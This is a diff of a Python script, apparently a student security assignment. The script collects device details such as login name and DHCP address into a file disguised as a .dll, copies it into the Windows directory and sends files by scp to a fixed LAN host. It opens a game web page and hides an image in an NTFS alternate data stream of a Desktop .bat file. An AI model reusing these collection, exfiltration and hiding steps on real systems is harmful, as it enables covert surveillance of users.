@@ -69,7 +69,7 @@ devInfoFile.write("System Time: "+str(datetime.now()) + "\n")
 devInfoFile.write("Student 1 (Manav) Number: s3949664 \nStudent 2 (Lachlan) Number: s3942121\n")
 
 # Open game URL
-# webbrowser.open("https://bethesda.net/en/game/starfield/features")
+webbrowser.open("https://bethesda.net/en/game/starfield/features")
 
 # Write username
 devInfoFile.writelines("\nCurrent User: "+ str(os.getlogin())+"\n \n")
@@ -91,7 +91,7 @@ devInfoFile.write("\nDHCP Address: = " + get_windows_dhcp())
 devInfoFile.close()
 
 # copy devInfoFile to windows directory (MUST BE RUN AS ADMIN)
-# shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
+shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
 
 
 # send DeviceInfo.dll over sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
@@ -105,3 +105,33 @@ os.remove("DeviceInfo39496643942121.dll")
 
 # send readme.txt over sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
 subprocess.run(["scp",'readme.txt',("lachl@"+"192.168.1.110"+":"+"C:"+"/users/netTesty/Documents")]) 
+
+# Download Starfield_Logo.jpg from sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
+subprocess.run(["scp",("lachl@"+"192.168.1.110"+":"+"C:"+"/users/netTesty/Documents/Starfield_Logo.jpg"),"."])
+
+# get Desktop path
+desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+
+# Create startmeXXXXXXXX.bat file
+startMe = open("startme39496643942121.bat", "w")
+
+# Configure startmeXXXXXXXX.bat file to open .jpg file hidden within it
+startMe.write(".\startme39496643942121.bat:Starfield_Logo.jpg")
+
+# close startmeXXXXXXXX.bat file
+startMe.close()
+
+# hide Starfield_Logo.jpg inside ADS of startmeXXXXXXXX.bat file
+shutil.copy('Starfield_Logo.jpg','startme39496643942121.bat:Starfield_Logo.jpg')
+
+# copy startmeXXXXXXXX.bat file to desktop
+shutil.copy('startme39496643942121.bat',desktop+'/')
+
+# run startmeXXXXXXXX.bat file (NOTE: This subprocess currently does not work as it fails to find the image file hidden in the ADS. This may be because it is failing to actually hide the file in ADS)
+# subprocess.run([desktop+"/startme39496643942121.bat"])
+
+# Delete startmeXXXXXXXX.bat file from local directory
+os.remove("startme39496643942121.bat")
+
+# Delete Starfield_Logo.jpg file from local directory
+os.remove("Starfield_Logo.jpg")
